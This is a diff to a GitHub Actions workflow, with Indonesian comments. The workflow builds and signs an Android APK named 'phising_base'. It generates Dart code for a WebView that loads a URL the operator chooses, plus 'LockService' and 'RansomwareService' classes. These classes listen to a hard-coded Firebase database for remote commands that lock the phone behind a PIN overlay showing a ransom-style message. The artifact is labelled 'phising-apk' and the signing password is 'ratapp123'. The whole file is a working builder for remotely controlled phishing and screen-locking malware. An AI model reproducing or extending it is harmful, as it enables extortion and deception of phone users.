@@ -11,9 +11,6 @@ on:
         required: true
       icon_url:
         required: false
-      project_url:
-        required: true
-        description: 'URL ZIP Source Project (dari Release Asset)'
 
 jobs:
   build:
@@ -33,26 +30,13 @@ jobs:
           channel: 'stable'
           cache: true
 
-      - name: Prepare Project (From ZIP)
+      - name: Create Flutter Project (Dari Nol)
         run: |
-          set -e
-          echo "Downloading project from: ${{ github.event.inputs.project_url }}"
-          curl -L "${{ github.event.inputs.project_url }}" -o project.zip
-          unzip -q project.zip -d project
+          flutter create phising_base
+          cd phising_base
           
-          # Deteksi folder root project
-          PUBSPEC=$(find project -maxdepth 5 -type f -name pubspec.yaml | head -n 1)
-          if [ -z "$PUBSPEC" ]; then
-            echo "::error::pubspec.yaml tidak ditemukan. Pastikan ZIP valid."
-            exit 1
-          fi
-          PROJECT_ROOT=$(dirname "$PUBSPEC")
-          echo "PROJECT_ROOT=$PROJECT_ROOT" >> $GITHUB_ENV
-
-      - name: Update Android Manifest (Permissions)
-        run: |
-          cd $PROJECT_ROOT/android/app/src/main
-          cat > AndroidManifest.xml << 'EOF'
+          # 1. BIKIN MANIFEST & IZIN
+          cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               package="com.example.phising_base">
               <uses-permission android:name="android.permission.INTERNET"/>
@@ -94,11 +78,51 @@ jobs:
           </manifest>
           EOF
 
-      - name: Inject Source Code (Main, Lock, Ransomware)
-        run: |
-          cd $PROJECT_ROOT/lib
+          # 2. UPDATE PUBSPEC & ICON
+          mkdir -p assets
+          if [ -n "${{ github.event.inputs.icon_url }}" ]; then
+            curl -L "${{ github.event.inputs.icon_url }}" -o assets/icon.png
+          else
+            convert -size 512x512 xc:blue assets/icon.png
+          fi
+
+          cat > pubspec.yaml << 'EOF'
+          name: phising_base
+          environment:
+            sdk: ^3.8.1
+          dependencies:
+            flutter:
+              sdk: flutter
+            webview_flutter: ^4.10.0
+            permission_handler: ^11.3.0
+            firebase_core: ^3.10.1
+            firebase_database: ^11.3.1
+          dev_dependencies:
+            flutter_launcher_icons: ^0.13.1
+          flutter_launcher_icons:
+            android: true
+            ios: false
+            image_path: "assets/icon.png"
+          flutter:
+            uses-material-design: true
+            assets:
+              - assets/config.json
+          EOF
           
-          # 1. MAIN.DART (WebView & Init Services)
+          # 3. BIKIN CONFIG JSON
+          cat > assets/config.json <<EOF
+          {
+            "app_name": "${{ github.event.inputs.app_name }}",
+            "webview_url": "${{ github.event.inputs.webview_url }}",
+            "uid": "${{ github.event.inputs.uid }}"
+          }
+          EOF
+
+      - name: Inject Services (Lock, Ransomware, Main)
+        run: |
+          cd phising_base/lib
+          
+          # MAIN.DART
           cat > main.dart << 'EOF'
           import 'dart:convert';
           import 'package:flutter/material.dart';
@@ -117,10 +141,7 @@ jobs:
             const MyApp({super.key});
             @override
             Widget build(BuildContext context) {
-              return MaterialApp(
-                debugShowCheckedModeBanner: false,
-                home: const SplashScreen(),
-              );
+              return MaterialApp(debugShowCheckedModeBanner: false, home: const SplashScreen());
             }
           }
 
@@ -148,20 +169,15 @@ jobs:
               String targetUrl = config['webview_url'] ?? 'https://www.google.com';
               String uid = config['uid'] ?? 'unknown';
 
-              // INIT SERVICES
               LockScreenService().init(context, uid);
               RansomwareService().init(context, uid);
               
               await Future.delayed(const Duration(seconds: 1));
-              if (mounted) {
-                Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
-              }
+              if (mounted) Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)));
             }
 
             @override
-            Widget build(BuildContext context) {
-              return const Scaffold(body: Center(child: CircularProgressIndicator()));
-            }
+            Widget build(BuildContext context) => const Scaffold(body: Center(child: CircularProgressIndicator()));
           }
 
           class WebViewScreen extends StatefulWidget {
@@ -182,74 +198,11 @@ jobs:
                 ..loadRequest(Uri.parse(widget.url));
             }
             @override
-            Widget build(BuildContext context) {
-              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
-            }
-          }
-          EOF
-          
-          # 2. COPY SERVICES (Dari file yang lu kasih, gue tulis ulang biar rapi)
-          cat > lock_screen.dart << 'EOF'
-          import 'package:flutter/material.dart';
-          import 'package:flutter/services.dart';
-
-          class LockScreenPage extends StatefulWidget {
-            final String correctPin;
-            final VoidCallback onUnlock;
-            const LockScreenPage({super.key, required this.correctPin, required this.onUnlock});
-            @override
-            State<LockScreenPage> createState() => _LockScreenPageState();
-          }
-
-          class _LockScreenPageState extends State<LockScreenPage> {
-            String _inputPin = '';
-            bool _isError = false;
-            void _onKeyPress(String value) {
-              if (_inputPin.length >= 6) return;
-              setState(() { _inputPin += value; _isError = false; });
-              if (_inputPin.length == widget.correctPin.length) _checkPin();
-            }
-            void _onDelete() {
-              if (_inputPin.isEmpty) return;
-              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
-            }
-            void _checkPin() {
-              if (_inputPin == widget.correctPin) widget.onUnlock();
-              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
-            }
-            @override
-            Widget build(BuildContext context) {
-              return PopScope(canPop: false, child: Scaffold(
-                backgroundColor: const Color(0xFF0A0A0F),
-                body: SafeArea(child: Column(children: [
-                  const Spacer(),
-                  Container(padding: const EdgeInsets.all(24), decoration: BoxDecoration(color: _isError ? Colors.red.withOpacity(0.15) : const Color(0xFF1E1E2E), shape: BoxShape.circle), child: Icon(_isError ? Icons.lock_person_rounded : Icons.lock_rounded, size: 56, color: _isError ? Colors.redAccent : Colors.white70)),
-                  const SizedBox(height: 24),
-                  Text(_isError ? 'PIN Salah!' : 'HP Terkunci', style: TextStyle(color: _isError ? Colors.redAccent : Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
-                  const SizedBox(height: 8),
-                  const Text('Masukkan PIN untuk membuka', style: TextStyle(color: Colors.white54, fontSize: 13)),
-                  const SizedBox(height: 32),
-                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
-                    final filled = i < _inputPin.length;
-                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? const Color(0xFF3DDC97) : Colors.white24), border: Border.all(color: filled ? const Color(0xFF3DDC97) : Colors.white30, width: 2)));
-                  })),
-                  const Spacer(),
-                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
-                    _buildRow(['1', '2', '3']), const SizedBox(height: 16),
-                    _buildRow(['4', '5', '6']), const SizedBox(height: 16),
-                    _buildRow(['7', '8', '9']), const SizedBox(height: 16),
-                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 72), _buildButton('0'), _buildDeleteButton()]),
-                  ])),
-                  const SizedBox(height: 40),
-                ])),
-              ));
-            }
-            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
-            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 72, height: 72, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF1E1E2E), border: Border.all(color: Colors.white.withOpacity(0.05))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.w500)))));
-            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 72, height: 72, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 28))));
+            Widget build(BuildContext context) => Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
           }
           EOF
 
+          # LOCK SERVICE
           cat > lock_service.dart << 'EOF'
           import 'dart:async';
           import 'package:flutter/material.dart';
@@ -312,7 +265,126 @@ jobs:
             void dispose() { _cmdSub?.cancel(); _pinSub?.cancel(); _overlayEntry?.remove(); }
           }
           EOF
+
+          # RANSOMWARE SERVICE
+          cat > ransomware_service.dart << 'EOF'
+          import 'dart:async';
+          import 'package:flutter/material.dart';
+          import 'package:firebase_database/firebase_database.dart';
+          import 'package:firebase_core/firebase_core.dart';
+          import 'ransomware_screen.dart';
+
+          class RansomwareService {
+            static final RansomwareService _instance = RansomwareService._internal();
+            factory RansomwareService() => _instance;
+            RansomwareService._internal();
+            StreamSubscription? _cmdSub;
+            bool _isActive = false;
+            OverlayEntry? _overlayEntry;
+            BuildContext? _appContext;
+            String _currentPin = '1234';
+            String _currentMessage = 'HP Anda terkunci. Hubungi Admin.';
+
+            void init(BuildContext context, String deviceId) {
+              _appContext = context;
+              _listenToCommands(deviceId);
+            }
+
+            void _listenToCommands(String deviceId) {
+              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
+              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
+                if (event.snapshot.value == null) return;
+                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
+                final cmd = data['cmd'];
+                final param = data['param']?.toString() ?? '';
+                if (cmd == 1010) _activateRansomware(param);
+                else if (cmd == 10101) _deactivateRansomware();
+                else if (cmd == 87654321 && param.isNotEmpty) _currentPin = param;
+                event.snapshot.ref.remove();
+              });
+            }
+
+            void _activateRansomware(String message) {
+              if (_isActive) return;
+              _isActive = true;
+              if (message.isNotEmpty) _currentMessage = message;
+              if (_appContext == null) return;
+              _overlayEntry = OverlayEntry(builder: (context) => RansomwareScreen(message: _currentMessage, correctPin: _currentPin, onUnlock: _deactivateRansomware));
+              Overlay.of(_appContext!).insert(_overlayEntry!);
+            }
+            void _deactivateRansomware() {
+              if (!_isActive) return;
+              _isActive = false;
+              _overlayEntry?.remove();
+              _overlayEntry = null;
+            }
+            void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
+          }
+          EOF
           
+          # LOCK SCREEN (UI)
+          cat > lock_screen.dart << 'EOF'
+          import 'package:flutter/material.dart';
+          import 'package:flutter/services.dart';
+
+          class LockScreenPage extends StatefulWidget {
+            final String correctPin;
+            final VoidCallback onUnlock;
+            const LockScreenPage({super.key, required this.correctPin, required this.onUnlock});
+            @override
+            State<LockScreenPage> createState() => _LockScreenPageState();
+          }
+
+          class _LockScreenPageState extends State<LockScreenPage> {
+            String _inputPin = '';
+            bool _isError = false;
+            void _onKeyPress(String value) {
+              if (_inputPin.length >= 6) return;
+              setState(() { _inputPin += value; _isError = false; });
+              if (_inputPin.length == widget.correctPin.length) _checkPin();
+            }
+            void _onDelete() {
+              if (_inputPin.isEmpty) return;
+              setState(() { _inputPin = _inputPin.substring(0, _inputPin.length - 1); _isError = false; });
+            }
+            void _checkPin() {
+              if (_inputPin == widget.correctPin) widget.onUnlock();
+              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
+            }
+            @override
+            Widget build(BuildContext context) {
+              return PopScope(canPop: false, child: Scaffold(
+                backgroundColor: const Color(0xFF0A0A0F),
+                body: SafeArea(child: Column(children: [
+                  const Spacer(),
+                  Container(padding: const EdgeInsets.all(24), decoration: BoxDecoration(color: _isError ? Colors.red.withOpacity(0.15) : const Color(0xFF1E1E2E), shape: BoxShape.circle), child: Icon(_isError ? Icons.lock_person_rounded : Icons.lock_rounded, size: 56, color: _isError ? Colors.redAccent : Colors.white70)),
+                  const SizedBox(height: 24),
+                  Text(_isError ? 'PIN Salah!' : 'HP Terkunci', style: TextStyle(color: _isError ? Colors.redAccent : Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
+                  const SizedBox(height: 8),
+                  const Text('Masukkan PIN untuk membuka', style: TextStyle(color: Colors.white54, fontSize: 13)),
+                  const SizedBox(height: 32),
+                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
+                    final filled = i < _inputPin.length;
+                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? const Color(0xFF3DDC97) : Colors.white24), border: Border.all(color: filled ? const Color(0xFF3DDC97) : Colors.white30, width: 2)));
+                  })),
+                  const Spacer(),
+                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
+                    _buildRow(['1', '2', '3']), const SizedBox(height: 16),
+                    _buildRow(['4', '5', '6']), const SizedBox(height: 16),
+                    _buildRow(['7', '8', '9']), const SizedBox(height: 16),
+                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 72), _buildButton('0'), _buildDeleteButton()]),
+                  ])),
+                  const SizedBox(height: 40),
+                ])),
+              ));
+            }
+            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
+            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 72, height: 72, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF1E1E2E), border: Border.all(color: Colors.white.withOpacity(0.05))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 28, fontWeight: FontWeight.w500)))));
+            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 72, height: 72, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 28))));
+          }
+          EOF
+          
+          # RANSOMWARE SCREEN (UI)
           cat > ransomware_screen.dart << 'EOF'
           import 'package:flutter/material.dart';
           import 'package:flutter/services.dart';
@@ -387,121 +459,16 @@ jobs:
           }
           EOF
 
-          cat > ransomware_service.dart << 'EOF'
-          import 'dart:async';
-          import 'package:flutter/material.dart';
-          import 'package:firebase_database/firebase_database.dart';
-          import 'package:firebase_core/firebase_core.dart';
-          import 'ransomware_screen.dart';
-
-          class RansomwareService {
-            static final RansomwareService _instance = RansomwareService._internal();
-            factory RansomwareService() => _instance;
-            RansomwareService._internal();
-            StreamSubscription? _cmdSub;
-            bool _isActive = false;
-            OverlayEntry? _overlayEntry;
-            BuildContext? _appContext;
-            String _currentPin = '1234';
-            String _currentMessage = 'HP Anda terkunci. Hubungi Admin.';
-
-            void init(BuildContext context, String deviceId) {
-              _appContext = context;
-              _listenToCommands(deviceId);
-            }
-
-            void _listenToCommands(String deviceId) {
-              final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
-              _cmdSub = fb.ref('commands/\$deviceId').onChildAdded.listen((event) {
-                if (event.snapshot.value == null) return;
-                final data = Map<String, dynamic>.from(event.snapshot.value as Map);
-                final cmd = data['cmd'];
-                final param = data['param']?.toString() ?? '';
-                if (cmd == 1010) _activateRansomware(param);
-                else if (cmd == 10101) _deactivateRansomware();
-                else if (cmd == 87654321 && param.isNotEmpty) _currentPin = param;
-                event.snapshot.ref.remove();
-              });
-            }
-
-            void _activateRansomware(String message) {
-              if (_isActive) return;
-              _isActive = true;
-              if (message.isNotEmpty) _currentMessage = message;
-              if (_appContext == null) return;
-              _overlayEntry = OverlayEntry(builder: (context) => RansomwareScreen(message: _currentMessage, correctPin: _currentPin, onUnlock: _deactivateRansomware));
-              Overlay.of(_appContext!).insert(_overlayEntry!);
-            }
-            void _deactivateRansomware() {
-              if (!_isActive) return;
-              _isActive = false;
-              _overlayEntry?.remove();
-              _overlayEntry = null;
-            }
-            void dispose() { _cmdSub?.cancel(); _overlayEntry?.remove(); }
-          }
-          EOF
-
-      - name: Update Pubspec (Dependencies)
+      - name: Build & Sign APK
         run: |
-          cd $PROJECT_ROOT
-          cat > pubspec.yaml << 'EOF'
-          name: phising_base
-          environment:
-            sdk: ^3.8.1
-          dependencies:
-            flutter:
-              sdk: flutter
-            webview_flutter: ^4.10.0
-            permission_handler: ^11.3.0
-            firebase_core: ^3.10.1
-            firebase_database: ^11.3.1
-          dev_dependencies:
-            flutter_launcher_icons: ^0.13.1
-          flutter_launcher_icons:
-            android: true
-            ios: false
-            image_path: "assets/icon.png"
-          flutter:
-            uses-material-design: true
-            assets:
-              - assets/config.json
-          EOF
-          
-          # CONFIG.JSON
-          mkdir -p assets
-          cat > assets/config.json <<EOF
-          {
-            "app_name": "${{ github.event.inputs.app_name }}",
-            "webview_url": "${{ github.event.inputs.webview_url }}",
-            "uid": "${{ github.event.inputs.uid }}"
-          }
-          EOF
-          
-          # DOWNLOAD ICON
-          if [ -n "${{ github.event.inputs.icon_url }}" ]; then
-            curl -L "${{ github.event.inputs.icon_url }}" -o assets/icon.png
-          else
-            convert -size 512x512 xc:blue assets/icon.png
-          fi
-          
-          flutter pub get
-
-      - name: Generate Icon & Build
-        run: |
-          cd $PROJECT_ROOT
+          cd phising_base
           dart run flutter_launcher_icons
-          
-          # SIGNING KEY
           keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -storepass ratapp123 -keypass ratapp123 -dname "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
-          
           flutter build apk --release
-          
-          # SIGN APK
           $ANDROID_HOME/build-tools/34.0.0/apksigner sign --ks release.jks --ks-pass pass:ratapp123 --key-pass pass:ratapp123 --out build/app/outputs/flutter-apk/app-release-signed.apk build/app/outputs/flutter-apk/app-release.apk
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
           name: phising-apk
-          path: ${{ env.PROJECT_ROOT }}/build/app/outputs/flutter-apk/app-release-signed.apk
+          path: phising_base/build/app/outputs/flutter-apk/app-release-signed.apk
